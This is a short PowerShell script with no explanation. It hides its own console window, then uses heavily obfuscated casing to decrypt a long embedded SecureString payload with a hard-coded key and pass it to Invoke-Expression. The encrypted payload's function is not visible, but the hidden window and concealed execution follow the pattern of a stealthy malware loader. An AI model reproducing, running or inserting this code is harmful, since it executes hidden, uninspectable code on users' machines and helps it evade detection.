$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
iNvOke-eXpRESSIon(( [rUNtimE.inTeRoPsErVIces.MaRSHaL]::([RuNtIme.iNtErOpSeRvICes.mArSHAL].GeTmEmbERs()[0].NaMe).iNVOke([RUNtime.iNtEROpSeRviCes.MArsHal]::seCuReSTRinGToGlobAlAlLOcAnsI( $('76492d1116743f0423413b16050a5345MgB8AHAAeABrAFcAWQBtAFUATgBhAEoAUQB0AGwAQQBzAFcAUgBRAE8AegBaAGcAPQA9AHwAZQAxADIANwBkADEAYQBjADAANAAwADIAZQA3AGUANgA5ADUAMgA0ADIAMQA3AGEAMQBjADYANABjADkAYQBhAGIAMQBmAGMAMwAyADMANgBiADYAZgA1AGYANwA5ADMANwAxADYAOQAyADUAZABhAGUAOABiADAAZgA3ADcANQBjAGEAZABkADEANgAxADQAOAAzADcAMwA4ADEANwAzADIAMgBlAGUAYwAwADMAMwA0ADUANgBmAGUAZAA0AGIAOQAyADgAMAA2ADkAMgBkAGYAZgBkADAAZABiADEAYQBhADEAYgAzAGIAYwA2AGYAZQA0AGIAYgA2ADMANABhADcANwBlAGEAZgAyADkAMABhAGYANgBkAGEANQA0ADgANwBhADYAZAA4AGQAYgBkADcAMwBlAGQAMwA2ADMAYQBjADAAZQA2AGEAMQAyADAANAA1ADQAMQAzADUAYQBlADUAZQAxAGUAYQBiADcAZQBlADcANgAxADQANwBiADgAMgBmAGQANQBkADgAZABmADEAMAAxAGEAZgA4AGEAZgA4ADQANwBjAGEANAAzADQAZgA4AGQANQAxADkAYwBhADYAOQAzADUAMgA3AGMANwBkAGUAYQAyADcAZABiAGMAZQA0ADAANgA3ADAAYwBjADgAMQAxADQANgAxAGIAYgAzAGEAMQBhADkAYQA5ADgAMwA0AGQAZQA4AGQAZABkADEAMQA4ADcAMQBhAGUAZQBmADQANgA5AGMAMwA1AGUAYwBmADUAMwAzAGUAMwAyAGMANgAwADcAYwA3ADkAOQAzADYAOABlADEAMgA4AGUAYgAyADMAZQBlAGYAOAAzAGQAOAA5ADQANwBjAGQAMAA5ADEAZgBlADIAZgA1ADMAMQAxADcAOQBiADkAZgA3AGEAZgAxADQAYwAzAGYAOABjAGUAOQBhADYAMAA5AGYAZgAyADAAOQBlADMAMQBlADcAMQAyADgAYQA4ADAAYwA0AGUAMQA2ADAAYgBkADAANgAwADIAMwBjADIANQBhADgAMgBjAGUAMABmADMAMgA3AGQAZABkADUAZQBlADAAYwA5ADkAYQBmADkAMQAyAGMAYQA5ADEAYwA3AGYAMAA2ADIAYgA5AGEANgBmADgANQBmADIAZABjADUAYQBhAGUAOAA1ADIAMgAyAGEANAAxADAAYQBjADUANgBlADQAOAAxADAAMgA1ADIAOAAyADAAZAA0ADYAYgA0ADUAYwA0ADIANQA4AGEAYwBhADUAMAA2ADAANgA3AGEANQAzAGMAMAA1ADEAMwBlADQAMwA2ADAANQA2ADYAMwAwAGIAOABiADYANQBkADIAYwBhAGYAZgBjADMAOQA1ADEANwA1AGEAYgBiAGMANwAyAGMAYwA5ADMANwBhADAAYgA3AGMANQBlADgAYwA0ADkAZgA0AGUANgA4ADIAMwA0ADEAYwAzADAAOABlAGEAZAA1AGUAMwAxADUANABkAGUAMABlAGIAZQA4AGQANQA0ADQAMgA5ADIAMwBhADEAMgBjADMAOABmAGYAMwA0AGIANwA1AGYAOQBiADEAYQA5ADAAMABhADUANwBmADQAOQAwADEAYwAzADUAYQBiADYANQA2ADMANwA2ADMAYwBjADkAZQA2ADAAZQBhADcANwA0ADEAZABlAGUAZgA1ADcANgBkAGEAYwAwADYAZQBmADIANwAyADgANQA3AGQAYwAxADcAYQA5AGEAZABlAGMAMQA3ADgAYwBlAGMAOAA1ADUAZQBkAGQAYQA4AGIAYgA0ADAANwBlADYAYgBhADIAZQA1AGMANAA4ADcANwBhAGIAZgBmAGYAMwA0ADAANQA2ADgAMwAwADcAZABjAGQAYgAyADAANwA0ADIAYgA1AGIAMQAzADcAMwAxADgAMgAxAGYANwBlADYAMwA5ADAAMgBjADkANQA4ADQAMgAzADMAOABmADIAMgAyAGIAYgA4AGYAMQA4ADIAYgA5AGQAZgA2AGEAZQAzADcAOAA3ADIAYQA4ADUANQA4AGEANgA2ADAAOQA2AGYAMABiADAAOQAyADYAMgA5AGQAZQAyAGIAOQA4ADcAMgBkAGYAMQAwADgAMAAxADIAOAA5ADgAYgBlADIANgA3AGUAMgBjADIAOQBmADQAZgBhADMANgBmAGEAMQBiADIAYgA2ADYAYwBkADEAYwA2ADQAZgBkAGUAYwA3ADIAYQA1ADUAZQA4AGEAOQA4ADAAMgAyAGIAYgA5ADIAZgBiAGUAZQBhADgAMgA4ADYAMwA5ADkANwBlAGMANABlAGEAMABhAGYAYwBiADMAMwBiADEANgA1ADEAMQAxAGMAMQA2AGQAYQAzADcAYwA4ADkANgBlAGEAYgA3AGUANQA5ADUAZgBkAGEAZAA4AGYAZQAwADYAYgAzAGUAOABmADUAMwAzADcANAAxADgAZABmADAAYQBlAGQAYwA1AGEAZAA2ADIANQBkADMANQAxAGIANQA3AGEAZAA2AGQAZQA1AGYANgA2ADcAZABlADkAYgA3ADEAMQBjADYAMQA3ADQANwA1ADEAMwA4ADQAMABhADUAYgA2ADkANQBhADkANAAyADgAZQA1ADkAMQA3ADQAYQAxAGQAYwBjAGUANgBjADMAOABlADUAMgA0ADgANwA3ADkAOAA0ADgANwAxADUANwAxAGIAOAA0ADAAYQAyAGIAYwA1ADAAZABlAGUAMgAxADgANQA1ADUAZgBjAGYAZQBjADYAOAAzADEANgA5ADIAMgBkAGEAZABhAGYAYQBiADIAZgBmADcAMQAzAGYANAA2AGUAZQAzADMAYQAzAGIAMQAyADQANABiADQAOABjADMANAA2AGUAZQBkAGQAMABhAGMAMQBiAGIANQA4AGEAOAAyADIAZQBkAGQAOQA5ADEAZgA2ADAAYQAyADMAOQAxAGMAZQBhAGMAOABlADAAMQBlADgANgBkAGIAOQAwAGUAYgAxADgAZQA2ADUAMwBlADYAOQA2AGMAZgAwADAAOQBlADAAZAA1AGQAZgA5AGMAOAA5ADgAMwA0ADgAZQAyAGEAZQBjADgAZgA5ADQAOQBjADkAMAA5ADIAYQA1ADgAZgA5AGEAYQBjAGIAYwA5AGUAMAAzAGIAZQBkADUAYgA5ADcAOQA4ADcAZgA1AGEAYwA1AGIAOQAyAGIAZQBjAGQAZgBiAGQANwBiAGUAZAAwADcAZQA2AGMAYQA0AGQAYwBlADgAYgA4ADEANQA0ADMAYwA1ADgAZAA4AGUAOQBjAGIAMAA4AGYAYgA1ADAANgAxADcAYwBlAGMAZgAwADAAZABjADAAOQAyAGEAOAAzAGIAZAA1ADMANgA4ADgAMABhADcANQBiADEAOABhAGMAZQBmADEANAA2ADUAZQBjADgAYQBlADAAMwA2AGYAMAA3ADEAOAA2ADkAYQAxADIANABlADMAMAAyADYANgA3ADEAYgA1ADMANgA2ADgAMgBiAGYANAA3ADUAMgA1ADMAYwAyADMAMQA0ADIANQAyADIAYwBlADEANgA3AGIANgA0AGYAOQBlAGMAMgA0AGUANgAzADgANABjADIANABlADUAZAA0ADEAMgA2AGEAZABlAGYANgAxAGQAMgA3ADMANgA0ADYANgBlADAAZABhADgAOQA0ADEAMQBiAGQANwAxADMAMAA5ADMANwA4AGIAYgAzAGUANAAyADEANwBkADYANQA3ADkAZQA4AGMAMAA4AGYAZQBkAGEANQBlADMAOQAyADkAOABiAGUANAA5ADYAYQAxADUANAAzADEANgBmADMAOAAzADcAMgA4AGMAOQBmADIANQA3ADYAZgBiADcANQA2ADYAYQBmAGUAZgAxADEAZgBhAGIANABlAGQAYwBlAGQAZAA3ADAAZABjAGEAZABhADQAYQAyADQAMwA1AGYANQAwADMAMgAzAGMAMgBjADQAMwBmAGIAZAAwADEAOABkAGIAMQBmADQANQBiADkAMAA5ADcANQBlADMAZAAxADUAOABkAGIAYQA2ADgAOAAxADUANgA5AGQAMgA3ADEANQAyADEANwBkADQAOQAyADYAOABkADEAOQA4ADcAOQAzADkAYwBmADkAMwA5ADgAMgBiADYAZgA1ADcAZgBmADYAZAA0ADYAMQA2ADMANABmADYAYgA5AGMAMQAyADAAYQBlAGIAYQBhAGEAZgBjADEAZQBjADkAZQA3AGMAMAAwADAANwAzADUAOQA0ADkAYQAxAGIAZQBlADcANAAwADUANAAxADQAZgA4AGEANgAzADIAMAAyADgAYgA5ADQAMgA5ADUAYgA0AGUAZgBiADMAMQAzAGQAZAAzAGYAOQAyADcAOQA4ADgAZAA0AGEANAA4AGQAZgBlAGYAYQAyADEAMwAyADcAZgA5ADUAMABjADcAMwA2AGQAZQBlADIAMAA4AGQAYwBjAGIANAAwAGYAMQBiAGIANwAzADAAMgAwADAANQBkADcAYgBkAGMAMwBhAGUAMAA1ADUAYQBlADIAOQAzADYANQAyAGMAOAAwADAAYQAwADgAYQA1ADIAMgBhAGYANQA0ADcAMwA1ADMANwAwAGIAZgA0AGUANwBlADIAZgBjADUAZQA4ADcAZgAyAGIANwA4AGMANgA0ADkAZQAxAGEAMAAxAGQANgA4ADEAYwAzADQAOABiADIAMwBhADMAMwA0ADYAMwBmAGMAOQBiADMAYQBlADkAZAA1AGIANQA5ADUAMgBlADYAMgA0ADUAMQA0ADAANQBjAGYAMwA5ADcAZQA3AGIAMAAyAGEAMQA3ADYAYQAzADcANgAwADkANgBmADcAOQBkADkAZAA5ADkAZQA3ADMANwBhADgAZQBhADkAMQA1ADYAZAA1ADYAYwA1AGYAMgBlADMAYwA3AGUAOABjAGMAMABlADEAYQAyAGYAYgA0AGMANgBkADUAYwAyADcAZAA1ADAAZAA0ADcAMAA5ADkANwA3ADkAZQAxADMANgBkADYAYwA3ADcANwA4AGQAMQA3AGQAYgA4AGEAYQA2ADAANAAyAGQANgBjADIANgAyADUAOAAyADQAMwBmADUAMAA2ADAAMABjADgAYgBjADEAMwA1AGYAMgBmADEAMgBjADMAYgAwADcAMwAwADMANQAxADcAOQAwAGEANQBkAGEAMgBhAGQANgA0ADUAMQA4AGMANgBkADIAMABlADgAMABlADAAOQBlADUAYwAzAGEANwBjAGMAMQAwAGIAYgAyAGIANAA5ADIANwA5ADYAYgAwADMAOABiAGQAYgAwADIAYgBmADcAMgAyAGIAYwAzADIAMQA5ADYAOABkADAAYwBjAGMAOAAxAGEANgBmADgANgBmAGEAMABlADQANQA3ADcAOQBjAGYAMAA1AGMANgBmADgAMAAyADkAYgBmADcAYgBkADAANAA2ADQAZAAyADQAYgBmAGYAOAA3AGUANwBiAGMANgBkADIANAA1AGMAMQA2ADEAMAAzADEAZQBkADkAZQA2ADYAMQAwADUAZgAyADgANQA3AGMANwAyADgAZQA2ADIAOABiAGIAMAA3AGYAOAAxAGYAOQBmADEANgAxADAAOABiAGYAOABmAGMAOABhAGUAYQAzADEAYgA2ADMAMwA3ADkAZAAzAGQAZABlADMAOAAyADUANgBjADgAMwBlADcAMgBmADgANwBkAGMAMwBlADEAOAA2ADYAMgBjADMAMQBmAGIAZgA4ADkAYwA1ADkAMgBiADIAMQA1AGMAYwAwAGIAMQA3AGUAMQAwAGIAMABjADIAZQA5ADYAYgBkADkANQBhADUANwA1ADgAMgBjADgAOAAzADgAMgA2ADYAOQA0AGUANQBlADQAMABjAGMAZABhADUAMAA2ADgANwAxAGYANQAzAGEAZgA4AGYAYgAxADcAZgBlADgAZAAwADMAYwBmADAANwBlAGYANgBhADMAOQBjAGUAZABjAGQAYgA1ADIAYwA4AGIANQBiADgAMQA2AGQAZQA5AGQAMgBiAGIAZAAyAGYAYQA2ADgAZgA0ADEANgAxADgAOAA0AGEAZQA4AGMAMgAyADUAYgAyADYANAAyADMANwA4ADMAYQBjADYAYgBmAGQAOAA4ADgANgBiAGUANQAzADMAYQA2AGQAYwAwADgAOQBhADMANgAxADQAYgA1ADIANgA0ADcAOQA0ADYAMgBiAGMANQBjADYAMwAwADEANAA3ADYANQAxADIAYwBiADUAYgBhADkAOQAxAGIANABmADkAYQBhADcANwAzAGMAYgAxAGYAYwA4AGQAZgBlADMAZQAyAGEAZgA1AGUAMgBhAGUANQBiAGIAMwAzADgAMAA1ADQAZQA1ADkAYgAyADMANAAxADYAYgA4ADYANQA5ADcANAAxAGYAOABiAGEAYwBkAGUAOAA5ADQAOABlADMAMgA0ADIAYwBhADgAYwA5AGUAYwBkADMAYwBjADgAZQA1ADcAOQAwADEANAAzAGIAZgAwAGYANQBiAGQAZAA4AGUAYgA3AGIAYQA5ADYAMwAxAGQAMABlADMANQBiADQAMwBkAGMAYwA4ADUANgBlAGQANAA4AGYANwBjADAANwBjAGYANgA2ADMAOQA3AGYAMwBmADcAYwAxADcANgBjAGMANgBhADkAZABkADEAZgBiADQAOAAwAGIANgA0AGQANwA2ADYAZgA5ADcANAA5ADIAZgBjADkANgAyAGQAZgBhADYAYwA3ADgAMQA4ADYANQA1ADIAYwBkADcAZAAwADAAOQA0ADMAMAA1AGYAYgAyAGUANgA2ADgANgA2ADYAMAAwADYAYQAyADEAMwA0AGUAOQA2ADUANABlAGIAMQA1AGIAZQBmADQAZQBkAGMANwAwAGUAZQBhADIANQBjAGYANwAzADMAYgBhADYAZQAyADEAMwA1AGQANgBlADYANgBkADAAYQA2ADUAYgA3ADYANQBmAGMANwA0ADcAOAAzADcAMgAzADgAOABjADAAMAA5AGEANABjADkAMwAzADEANAAzAGQAYgAzADYAOAA5AGUAZAAwADcAZQAzAGMA' | cONVERtto-sECuREsTRInG -Key  (230..215)) ))) )
